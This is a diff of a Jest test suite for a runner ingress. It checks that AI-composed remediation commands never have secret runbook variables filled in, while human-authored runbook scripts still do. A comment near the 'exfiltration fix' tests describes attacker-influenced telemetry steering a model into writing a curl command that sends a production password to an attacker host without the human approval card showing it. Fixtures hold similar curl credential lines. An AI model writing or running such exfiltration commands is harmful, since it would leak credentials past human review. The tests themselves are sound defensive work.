@@ -1,6 +1,7 @@
 import logger from "Common/Server/Utils/Logger";
 import RunnerService from "Common/Server/Services/RunnerService";
 import RunbookExecutionService from "Common/Server/Services/RunbookExecutionService";
+import CodeRepositoryRunnerChoice from "Common/Server/Utils/AI/CodeFix/CodeRepositoryRunnerChoice";
 import RunnerJobService, {
   MAX_AI_COMMAND_JOBS_PER_PROJECT_PER_HOUR,
 } from "Common/Server/Services/RunnerJobService";
@@ -9,6 +10,8 @@ import KubernetesClusterAiAccessService, {
 } from "Common/Server/Services/KubernetesClusterAiAccessService";
 import Runner from "Common/Models/DatabaseModels/Runner";
 import RunnerJob from "Common/Models/DatabaseModels/RunnerJob";
+import RunbookVariable from "Common/Models/DatabaseModels/RunbookVariable";
+import RunbookVariableService from "Common/Server/Services/RunbookVariableService";
 import RunbookStepType from "Common/Types/Runbook/RunbookStepType";
 import RunnerJobOrigin from "Common/Types/Runbook/RunnerJobOrigin";
 import RunnerJobStatus from "Common/Types/Runbook/RunnerJobStatus";
@@ -50,7 +53,8 @@ import {
  *      lease anything. The claim response carries the job's origin, omits
  *      runbookExecutionId for AiRemediation jobs (they have none), and still
  *      resolves SSH credentials at claim time exactly like runbook jobs. It
- *      must ALSO never expand {{runbookSecrets.*}} placeholders in an
+ *      must ALSO never fill in runbook variables ({{global.variables.*}},
+ *      {{local.variables.*}}, or the older {{runbookSecrets.*}}) in an
  *      AI-composed command — that substitution is for human-authored runbook
  *      scripts only, and doing it for AiRemediation jobs would be an
  *      exfiltration primitive.
@@ -180,22 +184,6 @@ jest.mock("Common/Server/Utils/Response", () => {
 });
 
 /*
- * The secrets util imports VMUtil -> isolated-vm, a native binding that is
- * not installed for this suite (and not under test). Claiming a Bash job
- * reaches populateInScript, so both functions get real-ish implementations
- * in beforeEach (no secrets, script passes through untouched).
- */
-jest.mock("../../FeatureSet/Runbook/Utils/Secrets", () => {
-  return {
-    __esModule: true,
-    default: {
-      loadForAgent: jest.fn(),
-      populateInScript: jest.fn(),
-    },
-  };
-});
-
-/*
  * Credential resolution is a DB read scoped to the claiming Runner; mocked
  * at the module boundary so the SSH claim test controls exactly what the
  * ingress hands back on the wire.
@@ -213,7 +201,6 @@ jest.mock("../../FeatureSet/Runbook/Utils/Credentials", () => {
 import RunnerIngressAPI from "../../FeatureSet/Runbook/API/RunnerIngress";
 import RunnerAuthorization from "../../FeatureSet/Runbook/Middleware/RunnerAuthorization";
 import { RunnerExpressRequest } from "../../FeatureSet/Runbook/Types/Request";
-import RunbookSecretsUtil from "../../FeatureSet/Runbook/Utils/Secrets";
 import RunbookCredentialsUtil from "../../FeatureSet/Runbook/Utils/Credentials";
 
 const HEARTBEAT_ROUTE: string = "/heartbeat";
@@ -235,10 +222,33 @@ const JOB_ID: ObjectID = new ObjectID("66666666-6666-4666-8666-666666666666");
 
 /*
  * A script that LOOKS harmless on an approval card but expands to plaintext
- * if the ingress ever runs secret substitution over it.
+ * if the ingress ever fills in runbook variables over it - and the same
+ * script in the syntax steps were written in before variables.
  */
 const SECRET_PLACEHOLDER_SCRIPT: string =
+  "curl -u admin:{{global.variables.PROD_PASSWORD}} https://internal.example.com/api";
+const LEGACY_SECRET_PLACEHOLDER_SCRIPT: string =
   "curl -u admin:{{runbookSecrets.PROD_PASSWORD}} https://internal.example.com/api";
+
+/*
+ * The project's PROD_PASSWORD, a secret runbook variable the claiming Runner
+ * may use: the one read the ingress makes to fill a variable in. Nothing an
+ * AI-composed command or a kubernetes-agent Runner is served may reach it.
+ */
+function stubVariableReads(runnerId: ObjectID): jest.SpyInstance {
+  return jest
+    .spyOn(RunbookVariableService, "findBy")
+    .mockImplementation(async (): Promise<Array<RunbookVariable>> => {
+      const row: RunbookVariable = new RunbookVariable();
+      row.name = "PROD_PASSWORD";
+      row.isSecret = true;
+      row.secretValue = "hunter2";
+      const runner: Runner = new Runner();
+      runner._id = runnerId.toString();
+      row.runners = [runner];
+      return [row];
+    });
+}
 
 type RouteCallResult = {
   thrownToNext: unknown;
@@ -326,7 +336,6 @@ describe("AI command capability gating on the agent ingress", () => {
    */
   function buildAgent(data: {
     canRunRunbooks?: boolean | undefined;
-    canRunCodeFixTasks?: boolean | undefined;
     canRunAiCommands?: boolean | undefined;
     // The Kubernetes posture the Runner last reported, when it has one.
     hostInfo?: JSONObject | undefined;
@@ -337,9 +346,6 @@ describe("AI command capability gating on the agent ingress", () => {
       name: "test-runner",
       ...(data.canRunRunbooks !== undefined
         ? { canRunRunbooks: data.canRunRunbooks }
-        : {}),
-      ...(data.canRunCodeFixTasks !== undefined
-        ? { canRunCodeFixTasks: data.canRunCodeFixTasks }
         : {}),
       ...(data.canRunAiCommands !== undefined
         ? { canRunAiCommands: data.canRunAiCommands }
@@ -396,15 +402,16 @@ describe("AI command capability gating on the agent ingress", () => {
       .mockResolvedValue(null);
     // A runbook job's run is read for its inputs; these runs have none.
     jest.spyOn(RunbookExecutionService, "findOneById").mockResolvedValue(null);
+    /*
+     * Code work is not a capability of the row: a code repository picks
+     * the Runner (its Runner setting in Code). None picks these Runners
+     * unless a test says one does.
+     */
+    jest
+      .spyOn(CodeRepositoryRunnerChoice, "isRunnerPickedByARepository")
+      .mockResolvedValue(false);
 
-    (RunbookSecretsUtil.loadForAgent as unknown as jest.Mock).mockResolvedValue(
-      [],
-    );
-    (
-      RunbookSecretsUtil.populateInScript as unknown as jest.Mock
-    ).mockImplementation((data: { script: string }): string => {
-      return data.script;
-    });
+    stubVariableReads(agentId);
     (
       RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
     ).mockResolvedValue(null);
@@ -454,11 +461,15 @@ describe("AI command capability gating on the agent ingress", () => {
     });
 
     test("reports canRunAiCommands false when the row explicitly revokes it", async () => {
+      // A code repository picks this Runner: its code work is separate.
+      jest
+        .spyOn(CodeRepositoryRunnerChoice, "isRunnerPickedByARepository")
+        .mockResolvedValue(true);
+
       await callRoute({
         uri: HEARTBEAT_ROUTE,
         agent: buildAgent({
           canRunRunbooks: true,
-          canRunCodeFixTasks: true,
           canRunAiCommands: false,
         }),
       });
@@ -732,44 +743,50 @@ describe("AI command capability gating on the agent ingress", () => {
   /*
    * The exfiltration fix.
    *
-   * {{runbookSecrets.NAME}} expansion exists for RUNBOOK scripts, every one
-   * of which a human authored. An AI-composed command is model output shaped
-   * by telemetry an attacker can influence, and it is reviewed as literal
-   * text on the approval card. If the ingress expanded placeholders there,
-   * `curl -u admin:{{runbookSecrets.PROD_PASSWORD}} https://attacker...`
+   * Runbook variable filling exists for RUNBOOK scripts, every one of which
+   * a human authored. An AI-composed command is model output shaped by
+   * telemetry an attacker can influence, and it is reviewed as literal text
+   * on the approval card. If the ingress filled placeholders in there,
+   * `curl -u admin:{{global.variables.PROD_PASSWORD}} https://attacker...`
    * would read as harmless on the card and arrive at the shell holding the
    * plaintext secret — a one-line exfiltration macro that also lands in the
    * job's captured output. So the placeholder must be served through
-   * VERBATIM for AiRemediation jobs, and the secrets util must not even be
-   * consulted (nothing to leak if nothing is loaded). AI commands reach
-   * credentials only via the credentialId path, which never exposes the
-   * material to the model.
+   * VERBATIM for AiRemediation jobs, and no variable may even be read
+   * (nothing to leak if nothing is loaded). AI commands reach credentials
+   * only via the credentialId path, which never exposes the material to the
+   * model.
    */
   describe("POST /claim-next-job never substitutes secrets into AI-composed commands", () => {
-    test("serves an AiRemediation script with its {{runbookSecrets.*}} placeholder intact and never calls the secrets util", async () => {
-      claimNextJobSpy.mockResolvedValue(
-        buildClaimedJob({
-          origin: RunnerJobOrigin.AiRemediation,
-          stepType: RunbookStepType.Bash,
-          script: SECRET_PLACEHOLDER_SCRIPT,
-        }),
-      );
+    test.each([
+      ["{{global.variables.*}}", SECRET_PLACEHOLDER_SCRIPT],
+      ["the older {{runbookSecrets.*}}", LEGACY_SECRET_PLACEHOLDER_SCRIPT],
+    ])(
+      "serves an AiRemediation script with its %s placeholder intact and reads no variable",
+      async (_label: string, script: string) => {
+        claimNextJobSpy.mockResolvedValue(
+          buildClaimedJob({
+            origin: RunnerJobOrigin.AiRemediation,
+            stepType: RunbookStepType.Bash,
+            script: script,
+          }),
+        );
 
-      const result: RouteCallResult = await callRoute({
-        uri: CLAIM_ROUTE,
-        agent: buildAgent({ canRunAiCommands: true }),
-      });
+        const result: RouteCallResult = await callRoute({
+          uri: CLAIM_ROUTE,
+          agent: buildAgent({ canRunAiCommands: true }),
+        });
 
-      expect(result.nextCallCount).toBe(0);
-      expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
-      expect(RunbookSecretsUtil.populateInScript).not.toHaveBeenCalled();
+        expect(result.nextCallCount).toBe(0);
+        expect(RunbookVariableService.findBy).not.toHaveBeenCalled();
 
-      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
+        const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
 
-      expect(job["script"]).toBe(SECRET_PLACEHOLDER_SCRIPT);
-      expect(job["script"]).toContain("{{runbookSecrets.PROD_PASSWORD}}");
-      expect(job["script"]).not.toContain("hunter2");
-    });
+        expect(job["script"]).toBe(script);
+        expect(job["script"]).toContain("PROD_PASSWORD}}");
+        expect(job["script"]).not.toContain("hunter2");
+        expect(job).not.toHaveProperty("secretValues");
+      },
+    );
 
     /*
      * Same guarantee for the SSH shape, where the command rides in the
@@ -799,8 +816,7 @@ describe("AI command capability gating on the agent ingress", () => {
         agent: buildAgent({ canRunAiCommands: true }),
       });
 
-      expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
-      expect(RunbookSecretsUtil.populateInScript).not.toHaveBeenCalled();
+      expect(RunbookVariableService.findBy).not.toHaveBeenCalled();
 
       const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
       const payload: JSONObject = job["payload"] as JSONObject;
@@ -810,54 +826,47 @@ describe("AI command capability gating on the agent ingress", () => {
 
     /*
      * The other half of the fix: runbook scripts must still get their
-     * secrets. The identical script, served to a Runbook-origin job, IS
-     * substituted — proving the skip is keyed on the job's origin and not
-     * on something that would quietly break runbooks.
+     * variables. The identical script, served to a Runbook-origin job, IS
+     * filled in — proving the skip is keyed on the job's origin and not on
+     * something that would quietly break runbooks.
      */
-    test("still substitutes secrets for a Runbook-origin job carrying the same script", async () => {
-      const substituted: string =
-        "curl -u admin:hunter2 https://internal.example.com/api";
-      const secrets: Array<unknown> = [{ name: "PROD_PASSWORD" }];
+    test.each([
+      ["{{global.variables.*}}", SECRET_PLACEHOLDER_SCRIPT],
+      ["the older {{runbookSecrets.*}}", LEGACY_SECRET_PLACEHOLDER_SCRIPT],
+    ])(
+      "still fills in %s for a Runbook-origin job carrying the same script",
+      async (_label: string, script: string) => {
+        claimNextJobSpy.mockResolvedValue(
+          buildClaimedJob({
+            origin: RunnerJobOrigin.Runbook,
+            stepType: RunbookStepType.Bash,
+            script: script,
+            runbookExecutionId: ObjectID.generate(),
+          }),
+        );
 
-      (
-        RunbookSecretsUtil.loadForAgent as unknown as jest.Mock
-      ).mockResolvedValue(secrets);
-      (
-        RunbookSecretsUtil.populateInScript as unknown as jest.Mock
-      ).mockReturnValue(substituted);
+        await callRoute({
+          uri: CLAIM_ROUTE,
+          agent: buildAgent({ canRunRunbooks: true }),
+        });
 
-      claimNextJobSpy.mockResolvedValue(
-        buildClaimedJob({
-          origin: RunnerJobOrigin.Runbook,
-          stepType: RunbookStepType.Bash,
-          script: SECRET_PLACEHOLDER_SCRIPT,
-          runbookExecutionId: ObjectID.generate(),
-        }),
-      );
+        expect(RunbookVariableService.findBy).toHaveBeenCalledTimes(1);
+        // The variables of the Runner's own project only.
+        const query: { projectId: ObjectID } = (
+          (RunbookVariableService.findBy as unknown as jest.Mock).mock
+            .calls[0]![0] as { query: { projectId: ObjectID } }
+        ).query;
+        expect(query.projectId.toString()).toBe(projectId.toString());
 
-      await callRoute({
-        uri: CLAIM_ROUTE,
-        agent: buildAgent({ canRunRunbooks: true }),
-      });
+        const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
 
-      expect(RunbookSecretsUtil.loadForAgent).toHaveBeenCalledTimes(1);
-      // The Runner's own secrets, held to the Runner's own project.
-      const loadArgs: { agentId: ObjectID; projectId: ObjectID } = (
-        RunbookSecretsUtil.loadForAgent as unknown as jest.Mock
-      ).mock.calls[0]![0] as { agentId: ObjectID; projectId: ObjectID };
-      expect(loadArgs.agentId.toString()).toBe(agentId.toString());
-      expect(loadArgs.projectId.toString()).toBe(projectId.toString());
-
-      expect(RunbookSecretsUtil.populateInScript).toHaveBeenCalledTimes(1);
-      expect(RunbookSecretsUtil.populateInScript).toHaveBeenCalledWith({
-        script: SECRET_PLACEHOLDER_SCRIPT,
-        secrets: secrets,
-      });
-
-      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
-
-      expect(job["script"]).toBe(substituted);
-    });
+        expect(job["script"]).toBe(
+          "curl -u admin:hunter2 https://internal.example.com/api",
+        );
+        // Handed over so the Runner hides it in what the step prints.
+        expect(job["secretValues"]).toEqual(["hunter2"]);
+      },
+    );
   });
 });
 
@@ -1242,14 +1251,7 @@ describe("POST /claim-next-job serves credential-less Kubectl jobs only to the i
       .spyOn(RunnerJobService, "submitResult")
       .mockResolvedValue(true);
 
-    (RunbookSecretsUtil.loadForAgent as unknown as jest.Mock).mockResolvedValue(
-      [],
-    );
-    (
-      RunbookSecretsUtil.populateInScript as unknown as jest.Mock
-    ).mockImplementation((data: { script: string }): string => {
-      return data.script;
-    });
+    stubVariableReads(agentId);
     (
       RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
     ).mockResolvedValue(null);
@@ -1278,8 +1280,8 @@ describe("POST /claim-next-job serves credential-less Kubectl jobs only to the i
     expect(job["stepType"]).toBe(RunbookStepType.Kubectl);
     expect((job["payload"] as JSONObject)["clusterIdentifier"]).toBe("prod-us");
     expect(job).not.toHaveProperty("credential");
-    // No secrets machinery for an AI-composed job, kubectl included.
-    expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
+    // No variables read for an AI-composed job, kubectl included.
+    expect(RunbookVariableService.findBy).not.toHaveBeenCalled();
   });
 
   test("matches the cluster identifier case-insensitively", async () => {
@@ -1501,14 +1503,7 @@ describe("POST /claim-next-job never hands a kubernetes-agent Runner credential 
       .spyOn(RunnerJobService, "submitResult")
       .mockResolvedValue(true);
 
-    (RunbookSecretsUtil.loadForAgent as unknown as jest.Mock).mockResolvedValue(
-      [],
-    );
-    (
-      RunbookSecretsUtil.populateInScript as unknown as jest.Mock
-    ).mockImplementation((data: { script: string }): string => {
-      return data.script;
-    });
+    stubVariableReads(agentId);
     (
       RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
     ).mockResolvedValue({
@@ -1616,8 +1611,7 @@ describe("POST /claim-next-job never hands a kubernetes-agent Runner credential 
       agent: runnerRow({ name: "kubernetes-agent/prod-a", hostInfo: {} }),
     });
 
-    expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
-    expect(RunbookSecretsUtil.populateInScript).not.toHaveBeenCalled();
+    expect(RunbookVariableService.findBy).not.toHaveBeenCalled();
   });
 
   test("narrows an agent Runner to kubectl by its name even when its heartbeat dropped the posture", async () => {
@@ -1754,8 +1748,7 @@ describe("POST /claim-next-job never hands a kubernetes-agent Runner credential 
         agent: runnerRow({ name, hostInfo }),
       });
 
-      expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
-      expect(RunbookSecretsUtil.populateInScript).not.toHaveBeenCalled();
+      expect(RunbookVariableService.findBy).not.toHaveBeenCalled();
     },
   );
 
